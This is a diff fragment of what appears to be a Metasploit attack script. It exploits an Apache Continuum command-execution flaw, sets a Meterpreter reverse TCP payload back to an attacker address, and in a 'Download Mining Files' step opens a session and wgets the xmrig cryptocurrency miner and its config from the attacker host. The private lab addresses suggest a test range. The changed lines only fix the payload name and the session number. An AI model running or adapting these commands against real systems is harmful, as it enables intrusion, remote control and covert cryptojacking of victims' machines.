@@ -14,7 +14,7 @@ run
 # ============================================================
 
 use exploit/linux/http/apache_continuum_cmd_exec
-set PAYLOAD linux/x86/meterpreter_reverse_tcp
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
 set LHOST 192.168.56.191
 set RHOSTS 192.168.56.181
 exploit -j -z
@@ -45,7 +45,7 @@ exploit -j -z
 # STEP 5 - Download Mining Files
 # ============================================================
 
-sessions -i 3
+sessions -i 6
 wget --no-check-certificate http://192.168.56.191:8000/downloads/xmrig
 wget --no-check-certificate http://192.168.56.191:8000/downloads/config.json
 wget --no-check-certificate http://192.168.56.191:8000/downloads/SHA256SUMS
